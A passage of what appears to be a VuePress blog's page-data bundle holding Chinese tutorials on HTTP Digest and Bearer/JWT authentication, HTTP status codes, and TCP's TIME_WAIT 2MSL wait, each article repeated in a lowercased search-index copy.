unauthorized给客户端，并附带challenge\n\n\n\n3.输入正确的用户名和密码后，浏览器会生成密码摘要以及其他信息发送给服务端，服务端认证成功后，返回一些与授权会话相关的附加信息，放在authorization-info中。\n\n其中，客户端选择的保护质量策略为auth，response就是通过计算得到的密码摘要，具体计算方式如下（使用默认的md5加密算法）：md5(md5(a1):<nonce>:<nc>:<cnonce>:<qop>:md5(a2))\n\n算法         a1\nmd5（默认）    <username>:<realm>:<password>\nmd5-sess   md5(<username>:<realm>:<password>):<nonce>:<cnonce>\n\nqop        a2\nauth（默认）   <request-method>:<uri>\nauth-int   <request-method>:<uri>:md5(<request-entity-body>)\n\n另外，rspauth使得客户端可以对服务器进行认证，称为响应摘要。响应摘要的计算与请求摘要类似，但由于响应中没有方法，而且报文实体数据有所不同，所有只有报文主题信息a2不同。具体区别如下：\n\nqop        a2\nauth（默认）   :<uri>\nauth-int   :<uri>:md5(<response-entity-body>)\n\n\n\n4.当服务端随机数过期时，再次请求认证，可以看到质询中增加了stale=true，用户无需再次输入用户名和密码，浏览器会自动使用新的质询参数进行密码摘要的计算。\n\n\n\n\n# 三、注意事项\n\n1.预授权：服务端预先告知客户端下一个随机数是多少，使得客户端可以直接生成正确的authorization首部，避免了多次“请求/质询”。常用的有一下三种方式：\n\n * 服务器预先在authorization-info成功首部中发送下一个随机数nextnonce。虽然这种机制加快了事务处理的速度，但是它也破坏了对同一台服务器的多次请求进行管道化的功能，可能会造成很大的损失。\n * 服务器允许在一小段时间内使用同一个随机数。这也就是我们上面剖析中使用的机制，在一定时间内使用同一个随机数或限制某个随机数的重用次数，当过期时，声明stale=true。虽然这确实降低了安全性，但是重用的随机数的生存周期是可控的，应该在安全和性能之间找到平衡。\n * 客户端和服务器使用同步的、可预测的随机数生成算法。\n\n2.rfc 2617建议采用这个假想的随机数公式：base64(timestamp md5(timestamp ":" etag ":" private-key)) 其中，timestamp是服务器产生随机数的时间或其他不重复的值，etag是与所请求实体有关的http etag首部的值，private-key是只有服务器知道的私钥。',charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"HTTP Bearer认证及JWT的使用",frontmatter:{title:"HTTP Bearer认证及JWT的使用",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/6ad155/",categories:["网络","网络协议","http_https"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/01.%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/01.http(s)/03.HTTP%20Bearer%E8%AE%A4%E8%AF%81%E5%8F%8AJWT%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"06.网络/01.网络协议/01.http(s)/03.HTTP Bearer认证及JWT的使用.md",key:"v-58192bc9",path:"/pages/6ad155/",headers:[{level:2,title:"1、理解Http的无状态特性",slug:"_1、理解http的无状态特性",normalizedTitle:"1、理解http的无状态特性",charIndex:11},{level:2,title:"2、为什么需要认证",slug:"_2、为什么需要认证",normalizedTitle:"2、为什么需要认证",charIndex:207},{level:2,title:"1、原理解析",slug:"_1、原理解析",normalizedTitle:"1、原理解析",charIndex:528},{level:2,title:"2. JWT协议",slug:"_2-jwt协议",normalizedTitle:"2. jwt协议",charIndex:854},{level:3,title:"2.1 什么是JWT",slug:"_2-1-什么是jwt",normalizedTitle:"2.1 什么是jwt",charIndex:867},{level:3,title:"2.2JWT协议优缺点",slug:"_2-2jwt协议优缺点",normalizedTitle:"2.2jwt协议优缺点",charIndex:931},{level:2,title:"3. JWT组成",slug:"_3-jwt组成",normalizedTitle:"3. jwt组成",charIndex:1167},{level:3,title:"（1）Header",slug:"_1-header",normalizedTitle:"（1）header",charIndex:1444},{level:3,title:"（2）Payload",slug:"_2-payload",normalizedTitle:"（2）payload",charIndex:1581},{level:3,title:"（3）signature",slug:"_3-signature",normalizedTitle:"（3）signature",charIndex:1850},{level:2,title:"4、JWT签名的目的",slug:"_4、jwt签名的目的",normalizedTitle:"4、jwt签名的目的",charIndex:2542},{level:2,title:"5. JWT安全性",slug:"_5-jwt安全性",normalizedTitle:"5. jwt安全性",charIndex:2923},{level:2,title:"6. JWT的适用场景",slug:"_6-jwt的适用场景",normalizedTitle:"6. jwt的适用场景",charIndex:3199}],headersStr:"1、理解Http的无状态特性 2、为什么需要认证 1、原理解析 2. JWT协议 2.1 什么是JWT 2.2JWT协议优缺点 3. JWT组成 （1）Header （2）Payload （3）signature 4、JWT签名的目的 5. JWT安全性 6. JWT的适用场景",content:"# 一、概述\n\n\n# 1、理解Http的无状态特性\n\nHTTP是一个无状态的协议，WEB服务器在处理所有传入HTTP请求时，根本就不知道某个请求是否是一个用户的第一次请求与后续请求，或者是另一个用户的请求。 WEB服务器每次在处理请求时，都会按照用户所访问的资源所对应的处理代码，从头到尾执行一遍，然后输出响应内容，WEB服务器根本不会记住已处理了哪些用户的请求，因此，我们通常说HTTP协议是无状态的。\n\n\n# 2、为什么需要认证\n\n虽然HTTP协议与WEB服务器是无状态，但我们的业务需求却要求有状态，典型的就是用户登录， 在这种业务需求中，要求WEB服务器端能区分某个请求是不是一个已登录用户发起的，或者当前请求是哪个用户发出的。 在开发WEB应用程序时，我们通常会使用Cookie来保存一些简单的数据供服务端维持必要的状态。总的来说，加入认证的根本原因就是确保请求的合法性以及资源的安全性，如下图：\n\n\n\n\n# 二、HTTP Bearer认证\n\nhttp认证根据凭证协议的不同，划分为不同的方式。常用的方式有：\n\n * HTTP基本认证\n * HTTP摘要认证\n * HTTP Bearer认证\n\n本篇文章介绍HTTP Bearer认证。\n\n\n# 1、原理解析\n\n下面通过图详细的了解下HTTP Bearer认证过程：\n\n\n\nBearer认证也是http协议中的标准认证方式，在Bearer认证中的凭证称为Bearer_token 或者Access_token。该种方式的优点就是灵活方便，因为凭证的生成和验证完全由开发人员设计和实现。一般凭证的设计尽量能保证以下几点：\n\n * 用户信息安全性，即保证重要信息不被泄露和恶意破解\n\n * 避免重放攻击\n\n * 更方便的适应更多的应用场景，主要体现在在服务端不需要凭证状态保存，分布式场景中，不需要状态共享\n\n * 少查库，减少服务端负担。\n\n目前最流行的token编码协议就是JWT(JSON WEB TOKEN)，下面通过jwt协议说明。\n\n\n# 2. JWT协议\n\n\n# 2.1 什么是JWT\n\nJson web token (JWT)，是一种基于JSON的开放标准（(RFC 7519)。\n\n\n# 2.2JWT协议优缺点\n\n优点：\n\n1、可以避免用户信息泄露。\n\n2、payload中可以携带一些必要的非敏感信息，比如用户名、用户邮箱，供前端使用\n\n3、服务端不用存放jwt的状态信息，减轻服务端压力,在分布式场景中更方便，不需要状态共享\n\n4、通过时间戳的方式避免重放攻击，token的时效性尽量短\n\n缺点：\n\n1、可以使用jwt 提供的jti，即jwt的id，来避免重放攻击，但是jti的值需要存储，不管是存储在redis还是mysql，都是要损耗性能的。\n\n\n# 3. JWT组成\n\n\n\nJWT是由三段信息构成的，将这三段信息文本连接起来就构成了Jwt字符串。第一部分我们称它为头部（header)，第二部分我们称其为载荷（payload)，第三部分是签证（signature)，下面是个JWT实例：\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiJBZG1pbiIsIkV4cGlyZSI6IjIwMjAtMDctMTEgMTY6NDc6MTYifQ.9ev6IGc1K3xvYaEfmMYeyFz5oHCM57fRGOvSZ-jvArw\n\n\n1\n\n\n\n# （1）Header\n\n\n\n在这里，我们说明了这是一个JWT，并且我们所用的签名算法是HS256算法。对它也要进行Base64编码，之后的字符串就成了JWT的Header（头部）:\n\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\n\n\n1\n\n\n\n# （2）Payload\n\n\n\n将上面的JSON对象进行[base64编码]可以得到下面的字符串。这个字符串我们将它称作JWT的Payload（载荷）：\n\neyJpc3MiOiJKb2huIFd1IEpXVCIsImlhdCI6MTQ0MTU5MzUwMiwiZXhwIjoxNDQxNTk0NzIyLCJhdWQiOiJ3d3cuZXhhbXBsZS5jb20iLCJzdWIiOiJqcm9ja2V0QGV4YW1wbGUuY29tIiwiZnJvbV91c2VyIjoiQiIsInRhcmdldF91c2VyIjoiQSJ9\n\n\n# （3）signature\n\njwt的第三部分是一个签证信息，这个签证信息由三部分组成：\n\n * header (base64后的)\n * payload (base64后的)\n * secret\n\n这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行secret组合加密，然后就构成了jwt的第三部分。\n\nvar encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload); var signature = HMACSHA256(encodedString, 'secret'); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n\n将这三部分用.连接成一个完整的字符串,构成了最终的jwt:\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n\n注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。\n\n\n# 4、JWT签名的目的\n\n最后一步签名的过程，实际上是对头部以及载荷内容进行签名。一般而言，加密算法对于不同的输入产生的输出总是不一样的。所以，如果有人对头部以及载荷的内容解码之后进行修改，再进行编码的话，那么新的头部和载荷的签名和之前的签名就将是不一样的。而且，如果不知道服务器加密的时候用的密钥的话，得出来的签名也一定会是不一样的。\n\n\n\n服务器应用在接受到JWT后，会首先对头部和载荷的内容用同一算法再次签名。那么服务器应用是怎么知道我们用的是哪一种算法呢？别忘了，我们在JWT的头部中已经用alg字段指明了我们的加密算法了。如果服务器应用对头部和载荷再次以同样方法签名之后发现，自己计算出来的签名和接受到的签名不一样，那么就说明这个Token的内容被别人动过的，我们应该拒绝这个Token，返回一个HTTP 401 Unauthorized响应。\n\n\n# 5. JWT安全性\n\n使用JWT会暴露信息吗？是的。所以，在JWT中，不应该在载荷里面加入任何敏感的数据。在上面的例子中，我们传输的是用户的User ID。这个值实际上不是什么敏感内容，一般情况下被知道也是安全的。但是像密码这样的内容就不能被放在JWT中了。如果将用户的密码放在了JWT中，那么怀有恶意的第三方通过Base64解码就能很快地知道你的密码了。总结如下：\n\n * 不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。\n * 保护好secret私钥，该私钥非常重要。\n * 如果可以，请使用https协议\n\n\n# 6. JWT的适用场景\n\nJWT适合用于向Web应用传递一些非敏感信息。其实JWT还经常用于设计用户认证和授权系统，甚至实现Web应用的单点登录。",normalizedContent:"# 一、概述\n\n\n# 1、理解http的无状态特性\n\nhttp是一个无状态的协议，web服务器在处理所有传入http请求时，根本就不知道某个请求是否是一个用户的第一次请求与后续请求，或者是另一个用户的请求。 web服务器每次在处理请求时，都会按照用户所访问的资源所对应的处理代码，从头到尾执行一遍，然后输出响应内容，web服务器根本不会记住已处理了哪些用户的请求，因此，我们通常说http协议是无状态的。\n\n\n# 2、为什么需要认证\n\n虽然http协议与web服务器是无状态，但我们的业务需求却要求有状态，典型的就是用户登录， 在这种业务需求中，要求web服务器端能区分某个请求是不是一个已登录用户发起的，或者当前请求是哪个用户发出的。 在开发web应用程序时，我们通常会使用cookie来保存一些简单的数据供服务端维持必要的状态。总的来说，加入认证的根本原因就是确保请求的合法性以及资源的安全性，如下图：\n\n\n\n\n# 二、http bearer认证\n\nhttp认证根据凭证协议的不同，划分为不同的方式。常用的方式有：\n\n * http基本认证\n * http摘要认证\n * http bearer认证\n\n本篇文章介绍http bearer认证。\n\n\n# 1、原理解析\n\n下面通过图详细的了解下http bearer认证过程：\n\n\n\nbearer认证也是http协议中的标准认证方式，在bearer认证中的凭证称为bearer_token 或者access_token。该种方式的优点就是灵活方便，因为凭证的生成和验证完全由开发人员设计和实现。一般凭证的设计尽量能保证以下几点：\n\n * 用户信息安全性，即保证重要信息不被泄露和恶意破解\n\n * 避免重放攻击\n\n * 更方便的适应更多的应用场景，主要体现在在服务端不需要凭证状态保存，分布式场景中，不需要状态共享\n\n * 少查库，减少服务端负担。\n\n目前最流行的token编码协议就是jwt(json web token)，下面通过jwt协议说明。\n\n\n# 2. jwt协议\n\n\n# 2.1 什么是jwt\n\njson web token (jwt)，是一种基于json的开放标准（(rfc 7519)。\n\n\n# 2.2jwt协议优缺点\n\n优点：\n\n1、可以避免用户信息泄露。\n\n2、payload中可以携带一些必要的非敏感信息，比如用户名、用户邮箱，供前端使用\n\n3、服务端不用存放jwt的状态信息，减轻服务端压力,在分布式场景中更方便，不需要状态共享\n\n4、通过时间戳的方式避免重放攻击，token的时效性尽量短\n\n缺点：\n\n1、可以使用jwt 提供的jti，即jwt的id，来避免重放攻击，但是jti的值需要存储，不管是存储在redis还是mysql，都是要损耗性能的。\n\n\n# 3. jwt组成\n\n\n\njwt是由三段信息构成的，将这三段信息文本连接起来就构成了jwt字符串。第一部分我们称它为头部（header)，第二部分我们称其为载荷（payload)，第三部分是签证（signature)，下面是个jwt实例：\n\neyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjvc2vyswqioijbzg1pbiisikv4cglyzsi6ijiwmjatmdctmtegmty6ndc6mtyifq.9ev6igc1k3xvyaefmmyeyfz5ohcm57frgovsz-jvarw\n\n\n1\n\n\n\n# （1）header\n\n\n\n在这里，我们说明了这是一个jwt，并且我们所用的签名算法是hs256算法。对它也要进行base64编码，之后的字符串就成了jwt的header（头部）:\n\neyj0exaioijkv1qilcjhbgcioijiuzi1nij9\n\n\n1\n\n\n\n# （2）payload\n\n\n\n将上面的json对象进行[base64编码]可以得到下面的字符串。这个字符串我们将它称作jwt的payload（载荷）：\n\neyjpc3mioijkb2huifd1iepxvcisimlhdci6mtq0mtu5mzuwmiwizxhwijoxndqxntk0nziylcjhdwqioij3d3cuzxhhbxbszs5jb20ilcjzdwiioijqcm9ja2v0qgv4yw1wbguuy29tiiwiznjvbv91c2vyijoiqiisinrhcmdldf91c2vyijoiqsj9\n\n\n# （3）signature\n\njwt的第三部分是一个签证信息，这个签证信息由三部分组成：\n\n * header (base64后的)\n * payload (base64后的)\n * secret\n\n这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行secret组合加密，然后就构成了jwt的第三部分。\n\nvar encodedstring = base64urlencode(header) + '.' + base64urlencode(payload); var signature = hmacsha256(encodedstring, 'secret'); // tjva95orm7e2cbab30rmhrhdcefxjoyzgefonfh7hgq\n\n将这三部分用.连接成一个完整的字符串,构成了最终的jwt:\n\neyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjzdwiioiixmjm0nty3odkwiiwibmftzsi6ikpvag4grg9liiwiywrtaw4ionrydwv9.tjva95orm7e2cbab30rmhrhdcefxjoyzgefonfh7hgq\n\n注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。\n\n\n# 4、jwt签名的目的\n\n最后一步签名的过程，实际上是对头部以及载荷内容进行签名。一般而言，加密算法对于不同的输入产生的输出总是不一样的。所以，如果有人对头部以及载荷的内容解码之后进行修改，再进行编码的话，那么新的头部和载荷的签名和之前的签名就将是不一样的。而且，如果不知道服务器加密的时候用的密钥的话，得出来的签名也一定会是不一样的。\n\n\n\n服务器应用在接受到jwt后，会首先对头部和载荷的内容用同一算法再次签名。那么服务器应用是怎么知道我们用的是哪一种算法呢？别忘了，我们在jwt的头部中已经用alg字段指明了我们的加密算法了。如果服务器应用对头部和载荷再次以同样方法签名之后发现，自己计算出来的签名和接受到的签名不一样，那么就说明这个token的内容被别人动过的，我们应该拒绝这个token，返回一个http 401 unauthorized响应。\n\n\n# 5. jwt安全性\n\n使用jwt会暴露信息吗？是的。所以，在jwt中，不应该在载荷里面加入任何敏感的数据。在上面的例子中，我们传输的是用户的user id。这个值实际上不是什么敏感内容，一般情况下被知道也是安全的。但是像密码这样的内容就不能被放在jwt中了。如果将用户的密码放在了jwt中，那么怀有恶意的第三方通过base64解码就能很快地知道你的密码了。总结如下：\n\n * 不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。\n * 保护好secret私钥，该私钥非常重要。\n * 如果可以，请使用https协议\n\n\n# 6. jwt的适用场景\n\njwt适合用于向web应用传递一些非敏感信息。其实jwt还经常用于设计用户认证和授权系统，甚至实现web应用的单点登录。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"HTTP各种响应码",frontmatter:{title:"HTTP各种响应码",date:"2022-04-25T00:48:54.000Z",permalink:"/pages/3584ce/",categories:["网络","网络协议","http(s)"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/01.%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/01.http(s)/05.HTTP%E5%90%84%E7%A7%8D%E5%93%8D%E5%BA%94%E7%A0%81.html",relativePath:"06.网络/01.网络协议/01.http(s)/05.HTTP各种响应码.md",key:"v-4a580704",path:"/pages/3584ce/",headers:[{level:2,title:"1xx: 信息",slug:"_1xx-信息",normalizedTitle:"1xx: 信息",charIndex:2},{level:2,title:"2xx: 成功",slug:"_2xx-成功",normalizedTitle:"2xx: 成功",charIndex:228},{level:2,title:"3xx: 重定向",slug:"_3xx-重定向",normalizedTitle:"3xx: 重定向",charIndex:798},{level:2,title:"4xx: 客户端错误",slug:"_4xx-客户端错误",normalizedTitle:"4xx: 客户端错误",charIndex:1364},{level:2,title:"5xx: 服务器错误",slug:"_5xx-服务器错误",normalizedTitle:"5xx: 服务器错误",charIndex:2573}],headersStr:"1xx: 信息 2xx: 成功 3xx: 重定向 4xx: 客户端错误 5xx: 服务器错误",content:'# 1xx: 信息\n\n消息：                       描述：\n100 Continue              服务器仅接收到部分请求，但是一旦服务器并没有拒绝该请求，客户端应该继续发送其余的请求。\n101 Switching Protocols   服务器转换协议：服务器将遵从客户的请求转换到另外一种协议。\n103 Checkpoint            用于 PUT 或者 POST 请求恢复失败时的恢复请求建议。\n\n\n# 2xx: 成功\n\n消息：                                 描述：\n200 OK                              请求成功（这是对HTTP请求成功的标准应答。）\n201 Created                         请求被创建完成，同时新的资源被创建。\n202 Accepted                        供处理的请求已被接受，但是处理未完成。\n203 Non-Authoritative Information   请求已经被成功处理，但是一些应答头可能不正确，因为使用的是其他文档的拷贝。\n204 No Content                      请求已经被成功处理，但是没有返回新文档。浏览器应该继续显示原来的文档。如果用户定期地刷新页面，而Servlet可以确定用户文档足够新，这个状态代码是很有用的。\n205 Reset Content                   请求已经被成功处理，但是没有返回新文档。但浏览器应该重置它所显示的内容。用来强制浏览器清除表单输入内容。\n206 Partial Content                 客户发送了一个带有Range头的GET请求，服务器完成了它。\n\n\n# 3xx: 重定向\n\n消息：                      描述：\n300 Multiple Choices     多重选择。链接列表。用户可以选择某链接到达目的地。最多允许五个地址。\n301 Moved Permanently    所请求的页面已经转移至新的 URL 。\n302 Found                所请求的页面已经临时转移至新的 URL 。\n303 See Other            所请求的页面可在别的 URL 下被找到。\n304 Not Modified         未按预期修改文档。客户端有缓冲的文档并发出了一个条件性的请求（一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用。\n305 Use Proxy            客户请求的文档应该通过Location头所指明的代理服务器提取。\n306 Switch Proxy         目前已不再使用，但是代码依然被保留。\n307 Temporary Redirect   被请求的页面已经临时移至新的 URL 。\n308 Resume Incomplete    用于 PUT 或者 POST 请求恢复失败时的恢复请求建议。\n\n\n# 4xx: 客户端错误\n\n消息：                                   描述：\n400 Bad Request                       因为语法错误，服务器未能理解请求。\n401 Unauthorized                      合法请求，但对被请求页面的访问被禁止。因为被请求的页面需要身份验证，客户端没有提供或者身份验证失败。\n402 Payment Required                  此代码尚无法使用。\n403 Forbidden                         合法请求，但对被请求页面的访问被禁止。\n404 Not Found                         服务器无法找到被请求的页面。\n405 Method Not Allowed                请求中指定的方法不被允许。\n406 Not Acceptable                    服务器生成的响应无法被客户端所接受。\n407 Proxy Authentication Required     用户必须首先使用代理服务器进行验证，这样请求才会被处理。\n408 Request Timeout                   请求超出了服务器的等待时间。\n409 Conflict                          由于冲突，请求无法被完成。\n410 Gone                              被请求的页面不可用。\n411 Length Required                   "Content-Length" 未被定义。如果无此内容，服务器不会接受请求。\n412 Precondition Failed               请求中的前提条件被服务器评估为失败。\n413 Request Entity Too Large          由于所请求的实体太大，服务器不会接受请求。\n414 Request-URI Too Long              由于 URL 太长，服务器不会接受请求。当 POST 请求被转换为带有很长的查询信息的 GET\n                                      请求时，就会发生这种情况。\n415 Unsupported Media Type            由于媒介类型不被支持，服务器不会接受请求。\n416 Requested Range Not Satisfiable   客户端请求部分文档，但是服务器不能提供被请求的部分。\n417 Expectation Failed                服务器不能满足客户在请求中指定的请求头。\n\n\n# 5xx: 服务器错误\n\n消息：                                   描述：\n500 Internal Server Error             请求未完成。服务器遇到不可预知的情况。\n501 Not Implemented                   请求未完成。服务器不支持所请求的功能，或者服务器无法完成请求。\n502 Bad Gateway                       请求未完成。服务器充当网关或者代理的角色时，从上游服务器收到一个无效的响应。\n503 Service Unavailable               服务器当前不可用（过载或者当机）。\n504 Gateway Timeout                   网关超时。服务器充当网关或者代理的角色时，未能从上游服务器收到一个及时的响应。\n505 HTTP Version Not Supported        服务器不支持请求中指明的HTTP协议版本。\n511 Network Authentication Required   用户需要提供身份验证来获取网络访问入口。',normalizedContent:'# 1xx: 信息\n\n消息：                       描述：\n100 continue              服务器仅接收到部分请求，但是一旦服务器并没有拒绝该请求，客户端应该继续发送其余的请求。\n101 switching protocols   服务器转换协议：服务器将遵从客户的请求转换到另外一种协议。\n103 checkpoint            用于 put 或者 post 请求恢复失败时的恢复请求建议。\n\n\n# 2xx: 成功\n\n消息：                                 描述：\n200 ok                              请求成功（这是对http请求成功的标准应答。）\n201 created                         请求被创建完成，同时新的资源被创建。\n202 accepted                        供处理的请求已被接受，但是处理未完成。\n203 non-authoritative information   请求已经被成功处理，但是一些应答头可能不正确，因为使用的是其他文档的拷贝。\n204 no content                      请求已经被成功处理，但是没有返回新文档。浏览器应该继续显示原来的文档。如果用户定期地刷新页面，而servlet可以确定用户文档足够新，这个状态代码是很有用的。\n205 reset content                   请求已经被成功处理，但是没有返回新文档。但浏览器应该重置它所显示的内容。用来强制浏览器清除表单输入内容。\n206 partial content                 客户发送了一个带有range头的get请求，服务器完成了它。\n\n\n# 3xx: 重定向\n\n消息：                      描述：\n300 multiple choices     多重选择。链接列表。用户可以选择某链接到达目的地。最多允许五个地址。\n301 moved permanently    所请求的页面已经转移至新的 url 。\n302 found                所请求的页面已经临时转移至新的 url 。\n303 see other            所请求的页面可在别的 url 下被找到。\n304 not modified         未按预期修改文档。客户端有缓冲的文档并发出了一个条件性的请求（一般是提供if-modified-since头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用。\n305 use proxy            客户请求的文档应该通过location头所指明的代理服务器提取。\n306 switch proxy         目前已不再使用，但是代码依然被保留。\n307 temporary redirect   被请求的页面已经临时移至新的 url 。\n308 resume incomplete    用于 put 或者 post 请求恢复失败时的恢复请求建议。\n\n\n# 4xx: 客户端错误\n\n消息：                                   描述：\n400 bad request                       因为语法错误，服务器未能理解请求。\n401 unauthorized                      合法请求，但对被请求页面的访问被禁止。因为被请求的页面需要身份验证，客户端没有提供或者身份验证失败。\n402 payment required                  此代码尚无法使用。\n403 forbidden                         合法请求，但对被请求页面的访问被禁止。\n404 not found                         服务器无法找到被请求的页面。\n405 method not allowed                请求中指定的方法不被允许。\n406 not acceptable                    服务器生成的响应无法被客户端所接受。\n407 proxy authentication required     用户必须首先使用代理服务器进行验证，这样请求才会被处理。\n408 request timeout                   请求超出了服务器的等待时间。\n409 conflict                          由于冲突，请求无法被完成。\n410 gone                              被请求的页面不可用。\n411 length required                   "content-length" 未被定义。如果无此内容，服务器不会接受请求。\n412 precondition failed               请求中的前提条件被服务器评估为失败。\n413 request entity too large          由于所请求的实体太大，服务器不会接受请求。\n414 request-uri too long              由于 url 太长，服务器不会接受请求。当 post 请求被转换为带有很长的查询信息的 get\n                                      请求时，就会发生这种情况。\n415 unsupported media type            由于媒介类型不被支持，服务器不会接受请求。\n416 requested range not satisfiable   客户端请求部分文档，但是服务器不能提供被请求的部分。\n417 expectation failed                服务器不能满足客户在请求中指定的请求头。\n\n\n# 5xx: 服务器错误\n\n消息：                                   描述：\n500 internal server error             请求未完成。服务器遇到不可预知的情况。\n501 not implemented                   请求未完成。服务器不支持所请求的功能，或者服务器无法完成请求。\n502 bad gateway                       请求未完成。服务器充当网关或者代理的角色时，从上游服务器收到一个无效的响应。\n503 service unavailable               服务器当前不可用（过载或者当机）。\n504 gateway timeout                   网关超时。服务器充当网关或者代理的角色时，未能从上游服务器收到一个及时的响应。\n505 http version not supported        服务器不支持请求中指明的http协议版本。\n511 network authentication required   用户需要提供身份验证来获取网络访问入口。',charsets:{cjk:!0},lastUpdated:"2022/04/26, 22:10:09",lastUpdatedTimestamp:1650982209e3},{title:"TCP释放连接时为什么time_wait状态必须等待2MSL时间",frontmatter:{title:"TCP释放连接时为什么time_wait状态必须等待2MSL时间",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/e500fe/",categories:["网络","网络协议","tcp"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/01.%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/02.tcp/01.TCP%E9%87%8A%E6%94%BE%E8%BF%9E%E6%8E%A5%E6%97%B6%E4%B8%BA%E4%BB%80%E4%B9%88time_wait%E7%8A%B6%E6%80%81%E5%BF%85%E9%A1%BB%E7%AD%89%E5%BE%852MSL%E6%97%B6%E9%97%B4.html",relativePath:"06.网络/01.网络协议/02.tcp/01.TCP释放连接时为什么time_wait状态必须等待2MSL时间.md",key:"v-0cea273e",path:"/pages/e500fe/",headersStr:null,content:" 1. 为了保证A发送的最后一个ACK报文能够到达B。这个ACK报文段有可能丢失，因而使处在LAST-ACK状态的B收不到对已发送的FIN+ACK报文段的确认。B会超时重传这个FIN+ACK报文段，而A就能在2MSL时间内收到这个重传的FIN+ACK报文段。如果A在TIME-WAIT状态不等待一段时间，而是在发送完ACK报文段后就立即释放连接，就无法收到B重传的FIN+ACK报文段，因而也不会再发送一次确认报文段。这样，B就无法按照正常的步骤进入CLOSED状态。\n\n 2. A在发送完ACK报文段后，再经过2MSL时间，就可以使本连接持续的时间所产生的所有报文段都从网络中消失。这样就可以使下一个新的连接中不会出现这种旧的连接请求的报文段。\n\n什么是2MSL\n\nMSL是Maximum Segment Lifetime英文的缩写，中文可以译为“报文最大生存时间”，他是任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。因为tcp报文（segment）是ip数据报（datagram）的数据部分，具体称谓请参见《数据在网络各层中的称呼》一文，而ip头中有一个TTL域，TTL是time to live的缩写，中文可以译为“生存时间”，这个生存时间是由源主机设置初始值但不是存的具体时间，而是存储了一个ip数据报可以经过的最大路由数，每经过一个处理他的路由器此值就减1，当此值为0则数据报将被丢弃，同时发送ICMP报文通知源主机。RFC 793中规定MSL为2分钟，实际应用中常用的是30秒，1分钟和2分钟等。\n\n2MSL即两倍的MSL，TCP的TIME_WAIT状态也称为2MSL等待状态，当TCP的一端发起主动关闭，在发出最后一个ACK包后，即第3次握手完成后发送了第四次握手的ACK包后就进入了TIME_WAIT状态，必须在此状态上停留两倍的MSL时间，等待2MSL时间主要目的是怕最后一个ACK包对方没收到，那么对方在超时后将重发第三次握手的FIN包，主动关闭端接到重发的FIN包后可以再发一个ACK应答包。在TIME_WAIT状态时两端的端口不能使用，要等到2MSL时间结束才可继续使用。当连接处于2MSL等待阶段时任何迟到的报文段都将被丢弃。不过在实际应用中可以通过设置SO_REUSEADDR选项达到不必等待2MSL时间结束再使用此端口。\n\nTTL与MSL是有关系的但不是简单的相等的关系，MSL要大于等于TTL。",normalizedContent:" 1. 为了保证a发送的最后一个ack报文能够到达b。这个ack报文段有可能丢失，因而使处在last-ack状态的b收不到对已发送的fin+ack报文段的确认。b会超时重传这个fin+ack报文段，而a就能在2msl时间内收到这个重传的fin+ack报文段。如果a在time-wait状态不等待一段时间，而是在发送完ack报文段后就立即释放连接，就无法收到b重传的fin+ack报文段，因而也不会再发送一次确认报文段。这样，b就无法按照正常的步骤进入closed状态。\n\n 2. a在发送完ack报文段后，再经过2msl时间，就可以使本连接持续的时间所产生的所有报文段都从网络中消失。这样就可以使下一个新的连接中不会出现这种旧的连接请求的报文段。\n\n什么是2msl\n\nmsl是maximum segment lifetime英文的缩写，中文可以译为“报文最大生存时间”，他是任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。因为tcp报文（segment）是ip数据报（datagram）的数据部分，具体称谓请参见《数据在网络各层中的称呼》一文，而ip头中有一个ttl域，ttl是time to live的缩写，中文可以译为“生存时间”，这个生存时间是由源主机设置初始值但不是存的具体时间，而是存储了一个ip数据报可以经过的最大路由数，每经过一个处理他的路由器此值就减1，当此值为0则数据报将被丢弃，同时发送icmp报文通知源主机。rfc 